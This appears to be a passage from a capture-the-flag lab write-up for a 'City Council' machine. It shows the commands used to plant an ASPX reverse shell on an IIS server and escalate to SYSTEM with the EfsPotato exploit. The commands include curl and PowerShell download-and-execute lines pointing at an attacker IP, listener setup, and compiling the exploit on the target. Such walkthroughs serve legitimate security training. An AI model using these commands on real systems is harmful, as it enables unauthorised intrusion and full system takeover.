For our reverse shell, we use the following ASPX file:

[![Logo](<../../../.gitbook/assets/image (274)>)aspx-reverse-shell/shell.aspx at master · borjmz/aspx-reverse-shellGitHubchevron-right](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx)

In this file, we adjust the port and IP address. For clarity's sake, we choose a different port than before, even though Penelope supports and can capture multiple reverse shell on the same port.

![](<../../../.gitbook/assets/image (342)>)

Despite using Penelope, the upload function fails. We start a Python web server to place the reverse shell.

![](<../../../.gitbook/assets/image (343)>)

Next, we bring the shell to the machine using cURL alias.

Copy

```
curl http://10.200.37.204/shell.aspx -o shell.aspx
```

![](<../../../.gitbook/assets/image (344)>)

Then we create a new listener using Penelope. Here using port `4446`.

Copy

```
penelope -p 4446
```

![](<../../../.gitbook/assets/image (345)>)

Next, we call the reverse shell as follows:

Copy

```
http://city.local/shell.aspx
```

![](<../../../.gitbook/assets/image (346)>)

After a little longer, we get a connection. We are iis apppool\defaultapppool.

![](<../../../.gitbook/assets/image (347)>)

### [hashtag](city-council-or-writeups.md#shell-as-nt-authority-system) Shell as NT AUTHORITY SYSTEM

We see that we, as this user, have the `SeImpersonatePivilige` permission active.

Copy

```
whoami /priv
```

![](<../../../.gitbook/assets/image (348)>)

Since the `SeImpersonatePrivilege` is `enabled` we can make use of one of the infamous potato exploits. One of my favorite Potato exploits is the `EfsPotato` exploit. We can compile this on the machine if the `C#` compiler is available, and it should also go undetected.

[![Logo](<../../../.gitbook/assets/image (274)>)GitHub - zcgonvh/EfsPotato: Exploit for EfsPotato(MS-EFSR EfsRpcOpenFileRaw with SeImpersonatePrivilege local privalege escalation vulnerability).GitHubchevron-right](https://github.com/zcgonvh/EfsPotato)

We check for a compiler at `C:\Windows\Microsoft.Net\Framework\` and see a `v4.0` version is persent. Nice.

Copy

```
dir C:\Windows\Microsoft.Net\Framework\
```

![](<../../../.gitbook/assets/image (349)>)

The `csc.exe` to compile the exploit is present.

![](<../../../.gitbook/assets/image (350)>)

Next, we download the source file from our attacker machine, compile with the compiler found at `C:\Windows\Microsoft.Net\Framework\v4...` and execute it with the `whoami` command.

We download the file:

Copy

```
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile('http://10.200.37.204/EfsPotato/EfsPotato.cs','./EfsPotato.cs')"
```

![](<../../../.gitbook/assets/image (351)>)

Compile the potato exploit:

Copy

```
C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe EfsPotato.cs -nowarn:1691,618
```

![](<../../../.gitbook/assets/image (352)>)

Run `whoami` with the exploit. We are `NT authority\system`.

Copy

```
.\EfsPotato.exe whoami
```

![](<../../../.gitbook/assets/image (353)>)

Using the exploit we run our reverse shell binary again, `Penelope` can handle multiple connections.

Copy

```
.\EfsPotato.exe "cmd.exe /c C:\Temp\0xb0b.exe"
```

![](<../../../.gitbook/assets/image (354)>)

We receive another session on our Penelope instance running on port `4445`.

We can deattach our current session in this case with `CTRL + D`.

To interact with the new session we issue `session 2`.

We are `NT AUTHORITY SYSTEM` and find the final flag at `C:\Users\Administrator\root.txt`.

![](<../../../.gitbook/assets/image (355)>)

### [hashtag](city-council-or-writeups.md#recommendation) Recommendation

Don't miss out on the full-fledged pentest report that DKob has created for the scenario!

[![Logo](<../../../.gitbook/assets/image (356)>)City Council | Pentest Report | Pentest Reportsdocs.dragkob.comchevron-right](https://docs.dragkob.com/hacksmarter/city-council)

[PreviousImplicitchevron-left](https://0xb0b.gitbook.io/writeups/hack-smarter-labs/2026/implicit) [NextExceptionchevron-right](https://0xb0b.gitbook.io/writeups/hack-smarter-labs/2026/exception)

Last updated 1 month ago

Was this helpful?

This site uses cookies to deliver its service and to analyze traffic. By browsing this site, you accept the [privacy policy](https://policies.gitbook.com/privacy/cookies).

close

AcceptReject
